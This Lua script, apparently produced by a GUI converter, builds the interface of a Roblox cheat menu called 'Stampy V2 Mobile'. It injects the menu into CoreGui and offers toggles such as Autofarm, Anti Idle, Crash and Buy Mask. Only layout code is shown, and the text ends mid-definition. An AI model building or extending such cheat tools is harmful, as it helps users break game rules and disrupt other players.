-- Gui to Lua
-- Version: 3.2

-- Instances:

local ScreenGui = Instance.new("ScreenGui")
local Script = Instance.new("Frame")
local StampyV2 = Instance.new("Frame")
local UICorner = Instance.new("UICorner")
local TopHolder = Instance.new("Frame")
local UICorner_2 = Instance.new("UICorner")
local Stampy = Instance.new("TextLabel")
local Stampy_2 = Instance.new("TextLabel")
local Stampy_3 = Instance.new("TextLabel")
local Stampy_4 = Instance.new("TextLabel")
local ImageButton = Instance.new("ImageButton")
local Stampy_5 = Instance.new("TextLabel")
local ButtonHandler = Instance.new("Frame")
local UIListLayout = Instance.new("UIListLayout")
local Farm = Instance.new("TextButton")
local UICorner_3 = Instance.new("UICorner")
local Farm_2 = Instance.new("TextButton")
local UICorner_4 = Instance.new("UICorner")
local Farm_3 = Instance.new("Frame")
local FarmFrame = Instance.new("Frame")
local UICorner_5 = Instance.new("UICorner")
local UiListLayoutHolder = Instance.new("Frame")
local UIListLayout_2 = Instance.new("UIListLayout")
local AutoFarm = Instance.new("TextLabel")
local Toggle = Instance.new("ImageLabel")
local Button = Instance.new("TextButton")
local Circle = Instance.new("ImageLabel")
local Teleport = Instance.new("TextLabel")
local Toggle_2 = Instance.new("ImageLabel")
local Button_2 = Instance.new("TextButton")
local Circle_2 = Instance.new("ImageLabel")
local Teleport_2 = Instance.new("TextLabel")
local Toggle_3 = Instance.new("ImageLabel")
local Button_3 = Instance.new("TextButton")
local Circle_3 = Instance.new("ImageLabel")
local Teleport_3 = Instance.new("TextLabel")
local Toggle_4 = Instance.new("ImageLabel")
local Button_4 = Instance.new("TextButton")
local Circle_4 = Instance.new("ImageLabel")
local Teleport_4 = Instance.new("TextLabel")
local Toggle_5 = Instance.new("ImageLabel")
local Button_5 = Instance.new("TextButton")
local Circle_5 = Instance.new("ImageLabel")
local TextLabel = Instance.new("TextLabel")
local FarmFrame_2 = Instance.new("Frame")
local UICorner_6 = Instance.new("UICorner")
local UiListLayoutHolder_2 = Instance.new("Frame")
local UIListLayout_3 = Instance.new("UIListLayout")
local AutoFarm_2 = Instance.new("TextLabel")
local Toggle_6 = Instance.new("ImageLabel")
local Button_6 = Instance.new("TextButton")
local Circle_6 = Instance.new("ImageLabel")
local AutoFarm_3 = Instance.new("TextLabel")
local Toggle_7 = Instance.new("ImageLabel")
local Button_7 = Instance.new("TextButton")
local Circle_7 = Instance.new("ImageLabel")
local AutoFarm_4 = Instance.new("TextLabel")
local Toggle_8 = Instance.new("ImageLabel")
local Button_8 = Instance.new("TextButton")
local Circle_8 = Instance.new("ImageLabel")
local TextLabel_2 = Instance.new("TextLabel")
local FarmFrame_3 = Instance.new("Frame")
local UICorner_7 = Instance.new("UICorner")
local UiListLayoutHolder_3 = Instance.new("Frame")
local UIListLayout_4 = Instance.new("UIListLayout")
local AutoFarm_5 = Instance.new("TextLabel")
local Toggle_9 = Instance.new("ImageLabel")
local Button_9 = Instance.new("TextButton")
local Circle_9 = Instance.new("ImageLabel")
local AutoFarm_6 = Instance.new("TextLabel")
local Toggle_10 = Instance.new("ImageLabel")
local Button_10 = Instance.new("TextButton")
local Circle_10 = Instance.new("ImageLabel")
local AutoFarm_7 = Instance.new("TextLabel")
local Toggle_11 = Instance.new("ImageLabel")
local Button_11 = Instance.new("TextButton")
local Circle_11 = Instance.new("ImageLabel")
local AutoFarm_8 = Instance.new("TextLabel")
local Toggle_12 = Instance.new("ImageLabel")
local Button_12 = Instance.new("TextButton")
local Circle_12 = Instance.new("ImageLabel")
local TextLabel_3 = Instance.new("TextLabel")
local Bar = Instance.new("Frame")

--Properties:

ScreenGui.Parent = game.CoreGui

Script.Name = "Script"
Script.Parent = ScreenGui
Script.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Script.BackgroundTransparency = 1.000
Script.BorderSizePixel = 0
Script.Position = UDim2.new(0.535934508, 0, 0.534317255, 0)
Script.Size = UDim2.new(0, 381, 0, 28)
Script.ZIndex = 4

StampyV2.Name = "StampyV2"
StampyV2.Parent = Script
StampyV2.BackgroundColor3 = Color3.fromRGB(29, 29, 29)
StampyV2.Position = UDim2.new(-0.00241187215, 0, -0.00657606125, 0)
StampyV2.Size = UDim2.new(0, 382, 0, 320)

UICorner.Parent = StampyV2

TopHolder.Name = "TopHolder"
TopHolder.Parent = StampyV2
TopHolder.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
TopHolder.Size = UDim2.new(0, 382, 0, 30)

UICorner_2.CornerRadius = UDim.new(0, 4)
UICorner_2.Parent = TopHolder

Stampy.Name = "Stampy"
Stampy.Parent = TopHolder
Stampy.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Stampy.BackgroundTransparency = 1.000
Stampy.Position = UDim2.new(0.0209999289, 0, 0, 0)
Stampy.Size = UDim2.new(0, 36, 0, 30)
Stampy.Font = Enum.Font.ArialBold
Stampy.Text = "Stampy"
Stampy.TextColor3 = Color3.fromRGB(255, 255, 255)
Stampy.TextSize = 14.000
Stampy.TextXAlignment = Enum.TextXAlignment.Left

Stampy_2.Name = "Stampy"
Stampy_2.Parent = TopHolder
Stampy_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Stampy_2.BackgroundTransparency = 1.000
Stampy_2.Position = UDim2.new(0.149214655, 0, 0, 0)
Stampy_2.Size = UDim2.new(0, 25, 0, 30)
Stampy_2.Font = Enum.Font.Highway
Stampy_2.Text = "V2"
Stampy_2.TextColor3 = Color3.fromRGB(94, 105, 255)
Stampy_2.TextSize = 14.000
Stampy_2.TextXAlignment = Enum.TextXAlignment.Left

Stampy_3.Name = "Stampy"
Stampy_3.Parent = TopHolder
Stampy_3.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Stampy_3.BackgroundTransparency = 1.000
Stampy_3.Position = UDim2.new(0.198952869, 0, 0, 0)
Stampy_3.Size = UDim2.new(0, 26, 0, 30)
Stampy_3.Font = Enum.Font.GothamBlack
Stampy_3.Text = "┃"
Stampy_3.TextColor3 = Color3.fromRGB(255, 255, 255)
Stampy_3.TextSize = 22.000
Stampy_3.TextXAlignment = Enum.TextXAlignment.Left

Stampy_4.Name = "Stampy"
Stampy_4.Parent = TopHolder
Stampy_4.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Stampy_4.BackgroundTransparency = 1.000
Stampy_4.Position = UDim2.new(0.238219902, 0, 0, 0)
Stampy_4.Size = UDim2.new(0, 53, 0, 30)
Stampy_4.Font = Enum.Font.Merriweather
Stampy_4.Text = "Mobile"
Stampy_4.TextColor3 = Color3.fromRGB(255, 255, 255)
Stampy_4.TextSize = 14.000
Stampy_4.TextXAlignment = Enum.TextXAlignment.Left

ImageButton.Parent = TopHolder
ImageButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ImageButton.BackgroundTransparency = 1.000
ImageButton.Position = UDim2.new(0.918848157, 0, 0.100000001, 0)
ImageButton.Size = UDim2.new(0, 22, 0, 24)
ImageButton.Image = "rbxassetid://7072725342"
ImageButton.ScaleType = Enum.ScaleType.Fit

Stampy_5.Name = "Stampy"
Stampy_5.Parent = TopHolder
Stampy_5.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Stampy_5.BackgroundTransparency = 1.000
Stampy_5.Position = UDim2.new(0.439790577, 0, 0, 0)
Stampy_5.Size = UDim2.new(0, 46, 0, 30)
Stampy_5.Font = Enum.Font.Merriweather
Stampy_5.Text = "NEW"
Stampy_5.TextColor3 = Color3.fromRGB(255, 255, 0)
Stampy_5.TextSize = 14.000
Stampy_5.TextXAlignment = Enum.TextXAlignment.Left

ButtonHandler.Name = "ButtonHandler"
ButtonHandler.Parent = StampyV2
ButtonHandler.BackgroundColor3 = Color3.fromRGB(29, 29, 29)
ButtonHandler.BorderSizePixel = 0
ButtonHandler.Position = UDim2.new(0.0235602092, 0, 0.134375006, 0)
ButtonHandler.Size = UDim2.new(0, 364, 0, 28)

UIListLayout.Parent = ButtonHandler
UIListLayout.FillDirection = Enum.FillDirection.Horizontal
UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder
UIListLayout.Padding = UDim.new(0, 4)

Farm.Name = "Farm"
Farm.Parent = ButtonHandler
Farm.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
Farm.Size = UDim2.new(0, 55, 0, 27)
Farm.Font = Enum.Font.Highway
Farm.Text = "Farm"
Farm.TextColor3 = Color3.fromRGB(255, 255, 255)
Farm.TextSize = 14.000

UICorner_3.CornerRadius = UDim.new(0, 4)
UICorner_3.Parent = Farm

Farm_2.Name = "Farm"
Farm_2.Parent = ButtonHandler
Farm_2.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
Farm_2.Size = UDim2.new(0, 55, 0, 27)
Farm_2.Font = Enum.Font.Highway
Farm_2.Text = "Settings"
Farm_2.TextColor3 = Color3.fromRGB(255, 255, 255)
Farm_2.TextSize = 14.000

UICorner_4.CornerRadius = UDim.new(0, 4)
UICorner_4.Parent = Farm_2

Farm_3.Name = "Farm"
Farm_3.Parent = StampyV2
Farm_3.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Farm_3.BackgroundTransparency = 1.000
Farm_3.Position = UDim2.new(0, 0, 0.221874997, 0)
Farm_3.Size = UDim2.new(0, 382, 0, 249)

FarmFrame.Name = "FarmFrame"
FarmFrame.Parent = Farm_3
FarmFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
FarmFrame.Position = UDim2.new(0.0235602092, 0, 0.0401606411, 0)
FarmFrame.Size = UDim2.new(0, 135, 0, 222)

UICorner_5.Parent = FarmFrame

UiListLayoutHolder.Name = "UiListLayoutHolder"
UiListLayoutHolder.Parent = FarmFrame
UiListLayoutHolder.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
UiListLayoutHolder.BackgroundTransparency = 1.000
UiListLayoutHolder.Position = UDim2.new(0.0592592582, 0, 0.0495495498, 0)
UiListLayoutHolder.Size = UDim2.new(0, 119, 0, 199)

UIListLayout_2.Parent = UiListLayoutHolder
UIListLayout_2.SortOrder = Enum.SortOrder.LayoutOrder
UIListLayout_2.Padding = UDim.new(0, 8)

AutoFarm.Name = "AutoFarm"
AutoFarm.Parent = UiListLayoutHolder
AutoFarm.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
AutoFarm.BackgroundTransparency = 1.000
AutoFarm.Position = UDim2.new(0, 0, 0.0603015088, 0)
AutoFarm.Size = UDim2.new(0, 65, 0, 16)
AutoFarm.Font = Enum.Font.Roboto
AutoFarm.Text = "Autofarm"
AutoFarm.TextColor3 = Color3.fromRGB(255, 255, 255)
AutoFarm.TextSize = 16.000
AutoFarm.TextXAlignment = Enum.TextXAlignment.Left

Toggle.Name = "Toggle"
Toggle.Parent = AutoFarm
Toggle.BackgroundColor3 = Color3.fromRGB(200, 200, 200)
Toggle.BackgroundTransparency = 1.000
Toggle.Position = UDim2.new(1.5709219, -23, 0.464981467, -11)
Toggle.Size = UDim2.new(0, 34, 0, 20)
Toggle.Image = "rbxassetid://3570695787"
Toggle.ImageColor3 = Color3.fromRGB(31, 31, 31)
Toggle.ScaleType = Enum.ScaleType.Slice
Toggle.SliceCenter = Rect.new(100, 100, 100, 100)
Toggle.SliceScale = 0.120

Button.Name = "Button"
Button.Parent = Toggle
Button.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Button.BackgroundTransparency = 1.000
Button.Size = UDim2.new(1, 0, 1, 0)
Button.Font = Enum.Font.SourceSans
Button.TextColor3 = Color3.fromRGB(0, 0, 0)
Button.TextSize = 14.000
Button.TextTransparency = 1.000

Circle.Name = "Circle"
Circle.Parent = Toggle
Circle.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Circle.BackgroundTransparency = 1.000
Circle.Position = UDim2.new(0, 4, 0, 3)
Circle.Size = UDim2.new(0, 11, 0, 13)
Circle.Image = "rbxassetid://3570695787"
Circle.ImageColor3 = Color3.fromRGB(17, 17, 17)
Circle.ScaleType = Enum.ScaleType.Slice
Circle.SliceCenter = Rect.new(100, 100, 100, 100)
Circle.SliceScale = 0.120

Teleport.Name = "Teleport"
Teleport.Parent = UiListLayoutHolder
Teleport.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Teleport.BackgroundTransparency = 1.000
Teleport.Position = UDim2.new(0, 0, 0.281407028, 0)
Teleport.Size = UDim2.new(0, 65, 0, 16)
Teleport.Font = Enum.Font.Roboto
Teleport.Text = "Shoe"
Teleport.TextColor3 = Color3.fromRGB(255, 255, 255)
Teleport.TextSize = 16.000
Teleport.TextXAlignment = Enum.TextXAlignment.Left

Toggle_2.Name = "Toggle"
Toggle_2.Parent = Teleport
Toggle_2.BackgroundColor3 = Color3.fromRGB(200, 200, 200)
Toggle_2.BackgroundTransparency = 1.000
Toggle_2.Position = UDim2.new(1.5709219, -23, 0.464981467, -11)
Toggle_2.Size = UDim2.new(0, 34, 0, 20)
Toggle_2.Image = "rbxassetid://3570695787"
Toggle_2.ImageColor3 = Color3.fromRGB(31, 31, 31)
Toggle_2.ScaleType = Enum.ScaleType.Slice
Toggle_2.SliceCenter = Rect.new(100, 100, 100, 100)
Toggle_2.SliceScale = 0.120

Button_2.Name = "Button"
Button_2.Parent = Toggle_2
Button_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Button_2.BackgroundTransparency = 1.000
Button_2.Size = UDim2.new(1, 0, 1, 0)
Button_2.Font = Enum.Font.SourceSans
Button_2.TextColor3 = Color3.fromRGB(0, 0, 0)
Button_2.TextSize = 14.000
Button_2.TextTransparency = 1.000

Circle_2.Name = "Circle"
Circle_2.Parent = Toggle_2
Circle_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Circle_2.BackgroundTransparency = 1.000
Circle_2.Position = UDim2.new(0, 4, 0, 3)
Circle_2.Size = UDim2.new(0, 11, 0, 13)
Circle_2.Image = "rbxassetid://3570695787"
Circle_2.ImageColor3 = Color3.fromRGB(17, 17, 17)
Circle_2.ScaleType = Enum.ScaleType.Slice
Circle_2.SliceCenter = Rect.new(100, 100, 100, 100)
Circle_2.SliceScale = 0.120

Teleport_2.Name = "Teleport"
Teleport_2.Parent = UiListLayoutHolder
Teleport_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Teleport_2.BackgroundTransparency = 1.000
Teleport_2.Position = UDim2.new(0, 0, 0.281407028, 0)
Teleport_2.Size = UDim2.new(0, 65, 0, 16)
Teleport_2.Font = Enum.Font.Roboto
Teleport_2.Text = "Hospital"
Teleport_2.TextColor3 = Color3.fromRGB(255, 255, 255)
Teleport_2.TextSize = 16.000
Teleport_2.TextXAlignment = Enum.TextXAlignment.Left

Toggle_3.Name = "Toggle"
Toggle_3.Parent = Teleport_2
Toggle_3.BackgroundColor3 = Color3.fromRGB(200, 200, 200)
Toggle_3.BackgroundTransparency = 1.000
Toggle_3.Position = UDim2.new(1.5709219, -23, 0.464981467, -11)
Toggle_3.Size = UDim2.new(0, 34, 0, 20)
Toggle_3.Image = "rbxassetid://3570695787"
Toggle_3.ImageColor3 = Color3.fromRGB(31, 31, 31)
Toggle_3.ScaleType = Enum.ScaleType.Slice
Toggle_3.SliceCenter = Rect.new(100, 100, 100, 100)
Toggle_3.SliceScale = 0.120

Button_3.Name = "Button"
Button_3.Parent = Toggle_3
Button_3.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Button_3.BackgroundTransparency = 1.000
Button_3.Size = UDim2.new(1, 0, 1, 0)
Button_3.Font = Enum.Font.SourceSans
Button_3.TextColor3 = Color3.fromRGB(0, 0, 0)
Button_3.TextSize = 14.000
Button_3.TextTransparency = 1.000

Circle_3.Name = "Circle"
Circle_3.Parent = Toggle_3
Circle_3.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Circle_3.BackgroundTransparency = 1.000
Circle_3.Position = UDim2.new(0, 4, 0, 3)
Circle_3.Size = UDim2.new(0, 11, 0, 13)
Circle_3.Image = "rbxassetid://3570695787"
Circle_3.ImageColor3 = Color3.fromRGB(17, 17, 17)
Circle_3.ScaleType = Enum.ScaleType.Slice
Circle_3.SliceCenter = Rect.new(100, 100, 100, 100)
Circle_3.SliceScale = 0.120

Teleport_3.Name = "Teleport"
Teleport_3.Parent = UiListLayoutHolder
Teleport_3.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Teleport_3.BackgroundTransparency = 1.000
Teleport_3.Position = UDim2.new(0, 0, 0.281407028, 0)
Teleport_3.Size = UDim2.new(0, 65, 0, 16)
Teleport_3.Font = Enum.Font.Roboto
Teleport_3.Text = "Lettuce"
Teleport_3.TextColor3 = Color3.fromRGB(255, 255, 255)
Teleport_3.TextSize = 16.000
Teleport_3.TextXAlignment = Enum.TextXAlignment.Left

Toggle_4.Name = "Toggle"
Toggle_4.Parent = Teleport_3
Toggle_4.BackgroundColor3 = Color3.fromRGB(200, 200, 200)
Toggle_4.BackgroundTransparency = 1.000
Toggle_4.Position = UDim2.new(1.5709219, -23, 0.464981467, -11)
Toggle_4.Size = UDim2.new(0, 34, 0, 20)
Toggle_4.Image = "rbxassetid://3570695787"
Toggle_4.ImageColor3 = Color3.fromRGB(31, 31, 31)
Toggle_4.ScaleType = Enum.ScaleType.Slice
Toggle_4.SliceCenter = Rect.new(100, 100, 100, 100)
Toggle_4.SliceScale = 0.120

Button_4.Name = "Button"
Button_4.Parent = Toggle_4
Button_4.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Button_4.BackgroundTransparency = 1.000
Button_4.Size = UDim2.new(1, 0, 1, 0)
Button_4.Font = Enum.Font.SourceSans
Button_4.TextColor3 = Color3.fromRGB(0, 0, 0)
Button_4.TextSize = 14.000
Button_4.TextTransparency = 1.000

Circle_4.Name = "Circle"
Circle_4.Parent = Toggle_4
Circle_4.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Circle_4.BackgroundTransparency = 1.000
Circle_4.Position = UDim2.new(0, 4, 0, 3)
Circle_4.Size = UDim2.new(0, 11, 0, 13)
Circle_4.Image = "rbxassetid://3570695787"
Circle_4.ImageColor3 = Color3.fromRGB(17, 17, 17)
Circle_4.ScaleType = Enum.ScaleType.Slice
Circle_4.SliceCenter = Rect.new(100, 100, 100, 100)
Circle_4.SliceScale = 0.120

Teleport_4.Name = "Teleport"
Teleport_4.Parent = UiListLayoutHolder
Teleport_4.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Teleport_4.BackgroundTransparency = 1.000
Teleport_4.Position = UDim2.new(0, 0, 0.281407028, 0)
Teleport_4.Size = UDim2.new(0, 65, 0, 16)
Teleport_4.Font = Enum.Font.Roboto
Teleport_4.Text = "Muscle"
Teleport_4.TextColor3 = Color3.fromRGB(255, 255, 255)
Teleport_4.TextSize = 16.000
Teleport_4.TextXAlignment = Enum.TextXAlignment.Left

Toggle_5.Name = "Toggle"
Toggle_5.Parent = Teleport_4
Toggle_5.BackgroundColor3 = Color3.fromRGB(200, 200, 200)
Toggle_5.BackgroundTransparency = 1.000
Toggle_5.Position = UDim2.new(1.5709219, -23, 0.464981467, -11)
Toggle_5.Size = UDim2.new(0, 34, 0, 20)
Toggle_5.Image = "rbxassetid://3570695787"
Toggle_5.ImageColor3 = Color3.fromRGB(31, 31, 31)
Toggle_5.ScaleType = Enum.ScaleType.Slice
Toggle_5.SliceCenter = Rect.new(100, 100, 100, 100)
Toggle_5.SliceScale = 0.120

Button_5.Name = "Button"
Button_5.Parent = Toggle_5
Button_5.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Button_5.BackgroundTransparency = 1.000
Button_5.Size = UDim2.new(1, 0, 1, 0)
Button_5.Font = Enum.Font.SourceSans
Button_5.TextColor3 = Color3.fromRGB(0, 0, 0)
Button_5.TextSize = 14.000
Button_5.TextTransparency = 1.000

Circle_5.Name = "Circle"
Circle_5.Parent = Toggle_5
Circle_5.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Circle_5.BackgroundTransparency = 1.000
Circle_5.Position = UDim2.new(0, 4, 0, 3)
Circle_5.Size = UDim2.new(0, 11, 0, 13)
Circle_5.Image = "rbxassetid://3570695787"
Circle_5.ImageColor3 = Color3.fromRGB(17, 17, 17)
Circle_5.ScaleType = Enum.ScaleType.Slice
Circle_5.SliceCenter = Rect.new(100, 100, 100, 100)
Circle_5.SliceScale = 0.120

TextLabel.Parent = FarmFrame
TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel.BackgroundTransparency = 1.000
TextLabel.Position = UDim2.new(0, 0, -0.0333333053, 0)
TextLabel.Size = UDim2.new(0, 59, 0, 14)
TextLabel.Font = Enum.Font.SourceSansBold
TextLabel.Text = "Farming"
TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel.TextSize = 18.000
TextLabel.TextXAlignment = Enum.TextXAlignment.Left

FarmFrame_2.Name = "FarmFrame"
FarmFrame_2.Parent = Farm_3
FarmFrame_2.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
FarmFrame_2.Position = UDim2.new(0.392670155, 0, 0.0401606411, 0)
FarmFrame_2.Size = UDim2.new(0, 135, 0, 83)

UICorner_6.Parent = FarmFrame_2

UiListLayoutHolder_2.Name = "UiListLayoutHolder"
UiListLayoutHolder_2.Parent = FarmFrame_2
UiListLayoutHolder_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
UiListLayoutHolder_2.BackgroundTransparency = 1.000
UiListLayoutHolder_2.Position = UDim2.new(0.0592592582, 0, 0.12577948, 0)
UiListLayoutHolder_2.Size = UDim2.new(0, 119, 0, 192)

UIListLayout_3.Parent = UiListLayoutHolder_2
UIListLayout_3.SortOrder = Enum.SortOrder.LayoutOrder
UIListLayout_3.Padding = UDim.new(0, 8)

AutoFarm_2.Name = "AutoFarm"
AutoFarm_2.Parent = UiListLayoutHolder_2
AutoFarm_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
AutoFarm_2.BackgroundTransparency = 1.000
AutoFarm_2.Position = UDim2.new(0, 0, 0.0550931767, 0)
AutoFarm_2.Size = UDim2.new(0, 65, 0, 16)
AutoFarm_2.Font = Enum.Font.Roboto
AutoFarm_2.Text = "Anti Idle"
AutoFarm_2.TextColor3 = Color3.fromRGB(255, 255, 255)
AutoFarm_2.TextSize = 16.000
AutoFarm_2.TextXAlignment = Enum.TextXAlignment.Left

Toggle_6.Name = "Toggle"
Toggle_6.Parent = AutoFarm_2
Toggle_6.BackgroundColor3 = Color3.fromRGB(200, 200, 200)
Toggle_6.BackgroundTransparency = 1.000
Toggle_6.Position = UDim2.new(1.5709219, -23, 0.464981467, -11)
Toggle_6.Size = UDim2.new(0, 34, 0, 20)
Toggle_6.Image = "rbxassetid://3570695787"
Toggle_6.ImageColor3 = Color3.fromRGB(31, 31, 31)
Toggle_6.ScaleType = Enum.ScaleType.Slice
Toggle_6.SliceCenter = Rect.new(100, 100, 100, 100)
Toggle_6.SliceScale = 0.120

Button_6.Name = "Button"
Button_6.Parent = Toggle_6
Button_6.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Button_6.BackgroundTransparency = 1.000
Button_6.Size = UDim2.new(1, 0, 1, 0)
Button_6.Font = Enum.Font.SourceSans
Button_6.TextColor3 = Color3.fromRGB(0, 0, 0)
Button_6.TextSize = 14.000
Button_6.TextTransparency = 1.000

Circle_6.Name = "Circle"
Circle_6.Parent = Toggle_6
Circle_6.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Circle_6.BackgroundTransparency = 1.000
Circle_6.Position = UDim2.new(0, 4, 0, 3)
Circle_6.Size = UDim2.new(0, 11, 0, 13)
Circle_6.Image = "rbxassetid://3570695787"
Circle_6.ImageColor3 = Color3.fromRGB(17, 17, 17)
Circle_6.ScaleType = Enum.ScaleType.Slice
Circle_6.SliceCenter = Rect.new(100, 100, 100, 100)
Circle_6.SliceScale = 0.120

AutoFarm_3.Name = "AutoFarm"
AutoFarm_3.Parent = UiListLayoutHolder_2
AutoFarm_3.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
AutoFarm_3.BackgroundTransparency = 1.000
AutoFarm_3.Position = UDim2.new(0, 0, 0.0550931767, 0)
AutoFarm_3.Size = UDim2.new(0, 65, 0, 16)
AutoFarm_3.Font = Enum.Font.Roboto
AutoFarm_3.Text = "Crash"
AutoFarm_3.TextColor3 = Color3.fromRGB(255, 255, 255)
AutoFarm_3.TextSize = 16.000
AutoFarm_3.TextXAlignment = Enum.TextXAlignment.Left

Toggle_7.Name = "Toggle"
Toggle_7.Parent = AutoFarm_3
Toggle_7.BackgroundColor3 = Color3.fromRGB(200, 200, 200)
Toggle_7.BackgroundTransparency = 1.000
Toggle_7.Position = UDim2.new(1.5709219, -23, 0.464981467, -11)
Toggle_7.Size = UDim2.new(0, 34, 0, 20)
Toggle_7.Image = "rbxassetid://3570695787"
Toggle_7.ImageColor3 = Color3.fromRGB(31, 31, 31)
Toggle_7.ScaleType = Enum.ScaleType.Slice
Toggle_7.SliceCenter = Rect.new(100, 100, 100, 100)
Toggle_7.SliceScale = 0.120

Button_7.Name = "Button"
Button_7.Parent = Toggle_7
Button_7.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Button_7.BackgroundTransparency = 1.000
Button_7.Size = UDim2.new(1, 0, 1, 0)
Button_7.Font = Enum.Font.SourceSans
Button_7.TextColor3 = Color3.fromRGB(0, 0, 0)
Button_7.TextSize = 14.000
Button_7.TextTransparency = 1.000

Circle_7.Name = "Circle"
Circle_7.Parent = Toggle_7
Circle_7.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Circle_7.BackgroundTransparency = 1.000
Circle_7.Position = UDim2.new(0, 4, 0, 3)
Circle_7.Size = UDim2.new(0, 11, 0, 13)
Circle_7.Image = "rbxassetid://3570695787"
Circle_7.ImageColor3 = Color3.fromRGB(17, 17, 17)
Circle_7.ScaleType = Enum.ScaleType.Slice
Circle_7.SliceCenter = Rect.new(100, 100, 100, 100)
Circle_7.SliceScale = 0.120

AutoFarm_4.Name = "AutoFarm"
AutoFarm_4.Parent = UiListLayoutHolder_2
AutoFarm_4.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
AutoFarm_4.BackgroundTransparency = 1.000
AutoFarm_4.Position = UDim2.new(0, 0, 0.0550931767, 0)
AutoFarm_4.Size = UDim2.new(0, 65, 0, 16)
AutoFarm_4.Font = Enum.Font.Roboto
AutoFarm_4.Text = "Buy Mask"
AutoFarm_4.TextColor3 = Color3.fromRGB(255, 255, 255)
AutoFarm_4.TextSize = 16.000
AutoFarm_4.TextXAlignment = Enum.TextXAlignment.Left

Toggle_8.Name = "Toggle"
Toggle_8.Parent = AutoFarm_4
Toggle_8.BackgroundColor3 = Color3.fromRGB(200, 200, 200)
Toggle_8.BackgroundTransparency = 1.000
Toggle_8.Position = UDim2.new(1.5709219, -23, 0.464981467, -11)
Toggle_8.Size = UDim2.new(0, 34, 0, 20)
Toggle_8.Image = "rbxassetid://3570695787"
Toggle_8.ImageColor3 = Color3.fromRGB(31, 31, 31)
Toggle_8.ScaleType = Enum.ScaleType.Slice
Toggle_8.SliceCenter = Rect.new(100, 100, 100, 100)
Toggle_8.SliceScale = 0.120

Button_8.Name = "Button"
Button_8.Parent = Toggle_8
Button_8.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Button_8.BackgroundTransparency = 1.000
Button_8.Size = UDim2.new(1, 0, 1, 0)
Button_8.Font = Enum.Font.SourceSans
Button_8.TextColor3 = Color3.fromRGB(0, 0, 0)
Button_8.TextSize = 14.000
Button_8.TextTransparency = 1.000

Circle_8.Name = "Circle"
Circle_8.Parent = Toggle_8
Circle_8.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Circle_8.BackgroundTransparency = 1.000
Circle_8.Position = UDim2.new(0, 4, 0, 3)
Circle_8.Size = UDim2.new(0, 11, 0, 13)
Circle_8.Image = "rbxassetid://3570695787"
Circle_8.ImageColor3 = Color3.fromRGB(17, 17, 17)
Circle_8.ScaleType = Enum.ScaleType.Slice
Circle_8.SliceCenter = Rect.new(100, 100, 100, 100)
Circle_8.SliceScale = 0.120

TextLabel_2.Parent = FarmFrame_2
TextLabel_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_2.BackgroundTransparency = 1.000
TextLabel_2.Position = UDim2.new(0, 0, -0.0935742706, 0)
TextLabel_2.Size = UDim2.new(0, 59, 0, 14)
TextLabel_2.Font = Enum.Font.Highway
TextLabel_2.Text = "Extra"
TextLabel_2.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_2.TextSize = 18.000
TextLabel_2.TextXAlignment = Enum.TextXAlignment.Left

FarmFrame_3.Name = "FarmFrame"
FarmFrame_3.Parent = Farm_3
FarmFrame_3.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
FarmFrame_3.Position = UDim2.new(0.392670155, 0, 0.437750995, 0)
FarmFrame_3.Size = UDim2.new(0, 135, 0, 123)

UICorner_7.Parent = FarmFrame_3

UiListLayoutHolder_3.Name = "UiListLayoutHolder"
UiListLayoutHolder_3.Parent = FarmFrame_3
UiListLayoutHolder_3.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
UiListLayoutHolder_3.BackgroundTransparency = 1.000
UiListLayoutHolder_3.Position = UDim2.new(0.0592592582, 0, 0.065040648, 0)
UiListLayoutHolder_3.Size = UDim2.new(0, 119, 0, 199)

UIListLayout_4.Parent = UiListLayoutHolder_3
UIListLayout_4.SortOrder = Enum.SortOrder.LayoutOrder
UIListLayout_4.Padding = UDim.new(0, 8)

AutoFarm_5.Name = "AutoFarm"
AutoFarm_5.Parent = UiListLayoutHolder_3
AutoFarm_5.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
AutoFarm_5.BackgroundTransparency = 1.000
AutoFarm_5.Position = UDim2.new(0, 0, 0.0550931767, 0)
AutoFarm_5.Size = UDim2.new(0, 65, 0, 16)
